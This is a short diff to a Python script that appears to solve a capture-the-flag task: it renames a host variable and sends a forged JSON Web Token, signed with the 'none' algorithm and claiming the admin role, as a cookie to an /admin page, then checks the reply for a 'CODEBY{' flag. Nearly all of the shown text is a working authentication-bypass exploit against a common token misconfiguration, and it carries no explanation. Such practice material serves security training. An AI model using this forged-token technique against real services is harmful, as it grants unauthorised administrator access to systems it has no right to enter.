@@ -5,13 +5,13 @@ import requests
 import pyperclip
 import html
 
-HOST = 'http://TASK_URL'
+TASK_URL = 'http://TASK_URL'
 JWT_HEADER = base64.urlsafe_b64encode('{"alg":"none","typ":"JWT"}'.encode()).replace(b'=', b'')
 JWT_PAYLOAD = base64.urlsafe_b64encode('{"username":"admin","role":"admin","exp":1000000}'.encode()).replace(b'=', b'')
 TOKEN = JWT_HEADER + b'.' + JWT_PAYLOAD + b'.'
 cookies = {'token': TOKEN.decode()}
 
-response = requests.get(f'{HOST}/admin', cookies=cookies)
+response = requests.get(f'{TASK_URL}/admin', cookies=cookies)
 
 if 'CODEBY{' in response.text:
 
